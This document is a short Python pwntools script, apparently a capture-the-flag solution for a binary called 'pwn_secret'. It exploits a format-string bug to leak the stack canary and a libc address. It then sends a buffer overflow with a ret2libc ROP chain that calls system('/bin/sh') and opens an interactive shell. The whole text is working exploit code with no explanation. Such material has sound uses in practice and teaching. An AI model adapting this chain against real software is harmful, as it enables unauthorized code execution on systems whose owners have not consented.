from pwn import *

e = ELF('./pwn_secret')
p = process('./pwn_secret')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

payload = '%15$p,%17$p'

print p.recvuntil('Name: ')
p.sendline(payload)
print p.recvuntil('Hillo ')
ret = p.recvline().rstrip('\n').split(',')
canary = int(ret[0],16)
libc_main_addr = int(ret[1],16)
leak_addr = libc_main_addr - libc.symbols['__libc_start_main'] - 243
print "Canary: " + hex(canary)
print "libc_main_addr: " + hex(libc_main_addr)

pop_rdi_addr = 0x00026bb2
ret_addr = 0x00026bb3

payload = 'A'* 0x88
payload += p64(canary)
payload += p64(0)
payload += p64(ret_addr + leak_addr)
payload += p64(pop_rdi_addr + leak_addr)
payload += p64(next(libc.search('/bin/sh')) + leak_addr)
payload += p64(libc.symbols['system'] + leak_addr)

print p.recvuntil('Phrase: ')
p.sendline(payload)
p.interactive()